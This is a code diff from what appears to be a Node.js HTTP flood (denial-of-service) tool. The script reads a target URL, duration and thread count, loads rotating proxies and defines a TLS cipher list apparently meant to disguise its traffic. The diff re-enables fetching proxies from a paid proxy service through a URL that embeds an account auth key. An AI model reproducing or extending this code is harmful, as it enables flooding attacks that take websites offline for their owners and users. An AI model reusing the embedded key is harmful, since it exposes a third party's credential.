@@ -76,7 +76,7 @@ const time = process.argv[3];
 const requestIP = process.argv[4];
 const threads = process.argv[5];
 const host = url.parse(target).host;
-/*
+
 var PROXYURL = `https://api.proxyscrape.com/v2/account/datacenter_shared/proxy-list?auth=ih4bqgny30vgwgprvvrh&type=displayproxies&country[]=all&protocol=http&format=normal&status=all`;
 
 log('[info] Loading proxies..');
@@ -88,16 +88,16 @@ var res = syncRequest("GET", PROXYURL, {
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
       },
     });
-    var proxies = res.getBody("utf8").replace(/\r/g, "").split("\n"); */
+    var proxies = res.getBody("utf8").replace(/\r/g, "").split("\n"); 
 var proxies = fs
   .readFileSync("proxy.txt", "utf-8")
   .toString()
   .replace(/\r/g, "")
   .split("\n");
-/*
+
 let Tls_connecT =
   "options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA";
-*/
+
 function between(min, max) {
   return Math.floor(Math.random() * (max - min) + min);
 }
